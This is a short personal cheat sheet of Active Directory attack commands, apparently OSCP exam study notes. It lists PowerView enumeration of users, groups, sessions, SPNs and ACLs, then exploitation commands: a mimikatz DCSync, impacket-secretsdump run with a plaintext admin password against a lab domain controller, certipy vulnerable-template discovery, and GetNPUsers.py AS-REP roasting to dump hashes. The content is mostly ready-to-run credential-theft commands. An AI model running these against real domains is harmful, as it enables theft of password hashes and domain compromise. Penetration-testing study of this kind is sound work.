Whenever you gain access to a domain user or dc01 attempt running these cmds.

TRY ALL CMDS in NXC and CMAPEXEC FIRST

MOST PROBABLE FOR WORKING, this is material from oscp study guide. "22 Active Directory Enumeration."

certutil the PowerView.ps1 and refer to documentation for cmd usage.

Get-NetUser | select cn -- all users

Get-NetGroup | select cn -- all groups

Get-NetComputer | select operatingsystem,dnshostname,operatingsystemversion -- all machines in domain

Get-NetSession -ComputerName files04 -Verbose -- See users logged into particular machine

Get-NetUser -SPN | select samaccountname,serviceprincipalname -- get a list of user spns

Get-ObjectAcl -Identity stephanie --  see ad rights

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104 -- Convert sid to name

Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights --  See which sids have GenericAll rights to certain group.

Find-DomainShare

MOST PROBABLE FOR WORKING EXPLOITATION, material from "23 Attacking AD auth"

AS-REP ROASTING

you know how

KERBEROASTING

you know how

SILVER TICKETS

DCSYNC

lsadump::dcsync /user:corp\<user>

impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

MISC CMDS

certipy find -vulnerable -u judith.mader -p judith09 -dc-ip <domainip> -stdout

GetNPUsers.py '<DOMAIN-DOMAIN.DOMAIN/> "ex. EGOTISTICAL-BANK.LOCAL/"' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast

